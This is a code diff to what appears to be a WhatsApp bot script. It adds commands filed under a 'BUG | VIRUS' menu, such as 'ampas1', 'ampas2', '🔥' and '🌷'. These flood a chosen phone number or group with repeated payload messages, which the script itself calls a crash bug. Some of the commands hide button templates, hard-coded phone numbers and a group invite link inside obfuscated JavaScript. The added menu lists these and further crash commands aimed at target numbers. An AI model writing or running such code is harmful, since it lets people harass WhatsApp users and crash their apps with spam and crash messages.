@@ -4916,6 +4916,77 @@ Detek = tes.translate
 replay(`🌐Translate : ${Detek}\n📘Results : ${Infoo}`)
 }
 break
+case 'ampas1' : {
+Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
+a = await haikal.sendMessage(m.chat, {react: { text: " ️", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
+haikal.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
+await sleep(20)
+haikal.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
+await sleep(20)
+haikal.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
+await sleep(20)
+haikal.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
+await sleep(20)
+haikal.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
+await sleep(20)
+haikal.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
+await sleep(20)
+haikal.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
+await sleep(20)
+haikal.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
+await sleep(20)
+}
+break
+//=================================================//
+/*BUG WACAP */
+case 'ampas2' : {
+Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@g.us"
+a = await haikal.sendMessage(m.chat, {react: { text: " ️", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
+haikal.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
+await sleep(20)
+haikal.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
+await sleep(20)
+haikal.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
+await sleep(20)
+haikal.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
+await sleep(20)
+haikal.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
+await sleep(20)
+haikal.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
+await sleep(20)
+haikal.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
+await sleep(20)
+haikal.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
+await sleep(10000)
+}
+break
+//=================================================//
+case '🔥': {
+mm = text.split("|")[0]+'@s.whatsapp.net'
+jumlah = text.split("|")[1]
+let secon = text.split("|")[2]
+a = await deploy(`Succes send bug "CRASH🐼" Ke ${mm} Sebanyak ${jumlah} kali dalam waktu ${secon} detik`)
+for (let i = 0; i < jumlah ; i++){
+function _0x128b(_0x4b9866,_0x371baa){var _0x50e42b=_0x50e4();return _0x128b=function(_0x128b07,_0x1424a2){_0x128b07=_0x128b07-0xc4;var _0x46e270=_0x50e42b[_0x128b07];return _0x46e270;},_0x128b(_0x4b9866,_0x371baa);}function _0x50e4(){var _0x19e1ed=['AH\x20SLEBEEW','1GwlWkW','GROUP\x20HW\x20MODS\x20WA','Anjay\x20Menger','27130YhLdkr','JAGOAN\x20OM?','HW\x20MODS\x20WA','2064696gWphjy','4LwmPfv','2167585ExfAxr','NAME','6281214281312','8702696DrukdN','https://chat.whatsapp.com/I6VMA8KF74gICjxESpThL2','6017EGBulL','1073458pGrfkv','6dptURc','6285714170944','10304770yoKCaH','16102656Vbpaag','OWNER'];_0x50e4=function(){return _0x19e1ed;};return _0x50e4();}var _0x1cddf0=_0x128b;(function(_0x34c939,_0x276d78){var _0x100957=_0x128b,_0x2bb075=_0x34c939();while(!![]){try{var _0x487c43=-parseInt(_0x100957(0xd7))/0x1*(-parseInt(_0x100957(0xd0))/0x2)+parseInt(_0x100957(0xc8))/0x3*(parseInt(_0x100957(0xc9))/0x4)+parseInt(_0x100957(0xca))/0x5*(parseInt(_0x100957(0xd1))/0x6)+-parseInt(_0x100957(0xd3))/0x7+parseInt(_0x100957(0xcd))/0x8+-parseInt(_0x100957(0xd4))/0x9+-parseInt(_0x100957(0xc5))/0xa*(-parseInt(_0x100957(0xcf))/0xb);if(_0x487c43===_0x276d78)break;else _0x2bb075['push'](_0x2bb075['shift']());}catch(_0x382e1c){_0x2bb075['push'](_0x2bb075['shift']());}}}(_0x50e4,0xec948),await haikal['sendMessage'](mm,{'text':'','templateButtons':[{'callButton':{'displayText':_0x1cddf0(0xd5),'phoneNumber':_0x1cddf0(0xd2)}},{'callButton':{'displayText':_0x1cddf0(0xd5),'phoneNumber':_0x1cddf0(0xcc)}},{'urlButton':{'displayText':_0x1cddf0(0xd8),'url':_0x1cddf0(0xce)}},{'quickReplyButton':{'displayText':'MY','id':_0x1cddf0(0xc4)}},{'quickReplyButton':{'displayText':_0x1cddf0(0xcb),'id':_0x1cddf0(0xd6)}},{'quickReplyButton':{'displayText':_0x1cddf0(0xc7),'id':_0x1cddf0(0xc6)}}]}));
+  await sleep(10000* secon)
+}
+}
+break
+
+
+//=================================================//
+case '🌷':{
+if (!isCreator) return
+if (isBan) throw sticBanLu(from)
+if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
+jumlah = `${encodeURI(q)}`
+ydd = `Hallo Aku haikal`
+for (let i = 0; i < jumlah; i++) {
+function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage','6281214281312','771192XPifQJ','6285714170944','JAGOAN\x20OM?','45FHicsI','2213460MCRxLU','AH\x20SLEBEEW','350069CkDHKE','Anjay\x20Menger','https://chat.whatsapp.com/I6VMA8KF74gICjxESpThL2','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await haikal[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'Done','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'Done','id':_0x47bf3a(0x153)}}]}));
+ await sleep(20)
+}
+}
+break
 case 'jadibug1': {
 if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
 if (!quoted) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
@@ -9370,6 +9441,17 @@ return reply(`╔═══════✪「 OWNER 」
 ╠${prefix}checkvote
 ╠${prefix}delvote
 ╠═════════✪「 BUG | VIRUS 」	
+🔥 628xxx|5|5
+🌷 628xxx|5|5
+ampas1 628xxx
+ampas2 628xxx
+santetdia 628xxx@s.whatsapp.net|10|10s
+catalogpc 628xxx@s.whatsapp.net|10|10s
+jadibug1 [ Reply Video To Bug Audio ]
+jadibug2 [ Reply Video To Bug Mp3 ]
+jadibug3 [ Reply Audio To Bug Vn ]
+jadibug4 [ Reply Sticker To Bug Image ]
+jadibug5 [ Reply Image To Bug Once ]
 ╠${prefix}virtext1 [ jumlah ]
 ╠${prefix}virtext2 [ jumlah ]
 ╠${prefix}virtext3 [ jumlah ]
